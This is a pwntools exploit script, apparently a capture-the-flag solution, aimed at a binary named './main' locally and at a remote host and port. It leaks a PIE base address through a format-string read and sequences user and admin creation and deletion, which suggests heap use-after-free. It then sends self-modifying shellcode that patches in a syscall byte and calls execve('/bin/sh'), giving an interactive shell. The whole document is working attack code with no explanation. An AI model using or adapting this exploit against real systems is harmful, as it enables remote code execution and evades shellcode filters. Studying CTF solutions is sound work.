from pwn import *
from icecream import ic

elf = exe = ELF("./main")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("34.89.138.139", 32276)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+266
b *main+916
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def create_admin(name):
    sla(b"6. Exit\n", b"1")
    sla(b"Enter the name of the admin:\n", name)

def create_user(name, desc):
    sla(b"6. Exit\n", b"2")
    sla(b"Enter the name of the user:\n", name)
    sla(b"Enter the description of the user:\n", desc)

def delete_admin():
    sla(b"6. Exit\n", b"3")

def delete_user():
    sla(b"6. Exit\n", b"4")

def login():
    sla(b"6. Exit\n", b"5")

sl(b'%25$p')
ru(b"What is the magic word?\n")
elf.address = int(ru(b" ").strip(), 16) - elf.sym['main']
ic(hex(elf.address))

create_user(b'a', b"King!")
delete_user()
create_admin(b'admin')
login()

# payload = asm(shellcraft.sh())
# print(disasm(payload))

payload = asm('''
add byte ptr [rip + 0x1d], 0x1
mov rax, 59
lea rdi, [rip+binsh]
mov rsi, 0
mov rdx, 0
.byte 0x0f, 0x04
binsh:
    .string "/bin/sh"
''')
print(disasm(payload))
payload += b'\x48\xC7\xC6\x12\x00\x00\x00' 
payload += b'\xFF\xD0'   
payload += b'\x48\xBA\x50\x6C\x65\x61\x73\x65\x21\x00' 
payload = payload.ljust(0x400, b'\x90')

# payload += b'\x0f\x05'          # 0x50f
# payload += b'\x31'
sl(payload) 
io.interactive()
